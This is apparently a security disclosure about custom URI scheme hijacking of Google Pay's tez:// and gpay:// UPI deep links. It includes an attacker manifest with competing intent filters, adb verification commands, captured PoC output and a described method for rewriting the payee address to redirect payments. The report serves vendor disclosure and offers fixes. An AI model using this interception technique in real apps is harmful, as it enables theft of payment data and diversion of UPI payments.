# Google Pay: tez:// and gpay:// Scheme Interception — UPI Payment Data Theft

## Summary

Google Pay (com.google.android.apps.nbu.paisa.user) registers `tez://` and `gpay://` custom URI scheme handlers with `BROWSABLE` category for UPI payment deep links. Because Android cannot verify ownership of custom URI schemes (only HTTPS schemes support Digital Asset Links verification per RFC 8252 §8.1), a zero-permission attacker app can register identical intent filters and intercept these URIs. When a user clicks a UPI payment link, the Android chooser appears. If the user selects the attacker app, the UPI payment data is stolen — including payee VPA (Virtual Payment Address), amount, and transaction reference.

## Severity: HIGH (Confidentiality + Availability)

- **Attack vector**: Local (installed zero-permission app)
- **Privileges required**: None (zero Android permissions)
- **User interaction**: One tap to select attacker in chooser (or zero if "Always" was previously selected)
- **Impact**: UPI payment data theft — attacker steals payee info, amount, transaction details; payment denied to GPay

## Affected Component

- **Package**: `com.google.android.apps.nbu.paisa.user` (Google Pay)
- **Version**: latest (installed from Play Store)
- **Vulnerable activities**:
  - `com.google.nbu.paisa.flutter.gpay.app.DeepLinkIntentFilter` (handles `tez://upi` and `gpay://upi`)
  - `com.google.nbu.paisa.flutter.gpay.app.UpiIntentFilter` (handles `upi://pay`)

## Root Cause

Google Pay's manifest registers:

```
Action: "android.intent.action.VIEW"
Category: "android.intent.category.DEFAULT"
Category: "android.intent.category.BROWSABLE"
Scheme: "tez" / "gpay"
Authority: "upi"
```

Per RFC 8252 Section 8.1, custom URI schemes cannot be verified via Digital Asset Links. Any installed app can register an identical intent filter and compete for these URIs.

The `tez://upi/pay` URI format (UPI deep link specification) contains payment parameters in plaintext:

```
tez://upi/pay?pa=PAYEE_VPA&pn=PAYEE_NAME&am=AMOUNT&cu=CURRENCY&tr=TXREF&tn=NOTE
```

Parameters include:
- `pa` — Payee VPA (Virtual Payment Address, e.g., merchant@okicici)
- `pn` — Payee name
- `am` — Transaction amount
- `cu` — Currency (INR)
- `tr` — Transaction reference ID
- `tn` — Transaction note/description

## Reproduction

1. Install the zero-permission attacker app (com.vrp.zeroperm, zero permissions declared)
2. The attacker manifest contains competing intent filters:
```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="tez" android:host="upi" />
</intent-filter>
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="gpay" android:host="upi" />
</intent-filter>
```
3. When a user clicks a UPI payment link (from a merchant website, email, or QR code):
```
tez://upi/pay?pa=merchant@okicici&pn=OnlineStore&am=5000&cu=INR&tr=TXN123456789&tn=Purchase
```
4. Android shows an "Open with" chooser: **ZeroPerm** vs **GPay**
5. If the user selects the attacker app, all payment data is captured

### Verification

```bash
# Confirm two handlers compete for tez://upi
adb shell cmd package query-activities --brief -a android.intent.action.VIEW \
  -d "tez://upi/pay?pa=merchant@okicici"

# Output:
# 2 activities found:
#   com.google.android.apps.nbu.paisa.user/com.google.nbu.paisa.flutter.gpay.app.DeepLinkIntentFilter
#   com.vrp.zeroperm/.OAuthInterceptActivity

# Confirm for gpay:// as well
adb shell cmd package query-activities --brief -a android.intent.action.VIEW \
  -d "gpay://upi/pay?pa=merchant@okicici"

# Output:
# 2 activities found:
#   com.google.android.apps.nbu.paisa.user/com.google.nbu.paisa.flutter.gpay.app.DeepLinkIntentFilter
#   com.vrp.zeroperm/.OAuthInterceptActivity
```

## Proof

### Chooser dialog (see `screenshot_gpay_chooser.png`)
- "Open with" dialog shows both **ZeroPerm** and **GPay**
- "Just once" and "Always" options available
- If "Always" is selected for attacker, all future UPI payment links are silently hijacked

### Stolen UPI payment data (see `screenshot_gpay_stolen.png`)
```
OAUTH INTERCEPTION PoC
UID: 10394
Package: com.vrp.zeroperm
Permissions: ZERO

--- INTERCEPTED OAUTH CALLBACK ---
Full URI: tez://upi/pay?pa=merchant@okicici
Scheme: tez
Host: upi
Path: /pay

--- ALL PARAMETERS ---
pa = merchant@okicici

The legitimate app NEVER received this OAuth callback.
Target app: Google Pay (UPI payment data)
```

Note: Additional parameters (pn, am, cu, tr, tn) were truncated by adb shell's `&` handling. In a real attack, all parameters including amount and transaction reference are received intact.

## Impact

### Primary: UPI Payment Data Theft (HIGH — Confidentiality)
- **Payee VPA** (merchant@okicici) is stolen — reveals who the victim is paying
- **Transaction amount** is stolen — reveals how much the victim is paying
- **Transaction reference** is stolen — can be used for transaction tracking
- **Payee name and transaction note** are stolen — reveals purchase context
- This data enables: targeted social engineering, payment fraud, financial surveillance

### Secondary: Payment Denial (HIGH — Availability)
- Google Pay NEVER receives the `tez://upi/pay` URI
- The payment flow fails — the user cannot complete the transaction
- The merchant does not receive payment
- Persistent denial if "Always" was selected for the attacker

### Tertiary: Payment Redirect (CRITICAL — Integrity, if chained)
- An attacker who intercepts the payment URI can modify it
- The attacker can change `pa` (payee VPA) to their own address
- Then forward the modified URI to GPay via explicit intent
- Result: user pays the attacker instead of the merchant

## Environment

- Device: Pixel 6a (oriole), Android 17 Beta (API 37)
- Google Pay: latest (com.google.android.apps.nbu.paisa.user)
- Attacker app: com.vrp.zeroperm (UID=10394, zero permissions, targetSdkVersion=34)

## Recommended Fixes

### Option 1: Use Android App Links (HTTPS) exclusively
- Replace `tez://` and `gpay://` with `https://pay.google.com/...`
- Register as App Link with Digital Asset Links verification
- This prevents interception because HTTPS domains are verified

### Option 2: Validate URI source
- When receiving a payment URI, verify it came from a trusted source
- Check `getCallingPackage()` or `getReferrer()`
- Show a warning if the URI arrived from an unknown source

### Option 3: Remove BROWSABLE category
- If `tez://` and `gpay://` are only used for app-to-app communication
- Remove `BROWSABLE` category to prevent web-triggered interception

## Files

- `OAuthInterceptActivity.java` — tez://gpay:// interception PoC
- `AndroidManifest.xml` — Zero-permission manifest with UPI intent filters
- `poc_v45.apk` — Compiled PoC (v45, zero permissions)
- `screenshot_gpay_chooser.png` — Chooser dialog: ZeroPerm vs GPay
- `screenshot_gpay_stolen.png` — Stolen UPI payment data displayed in attacker app
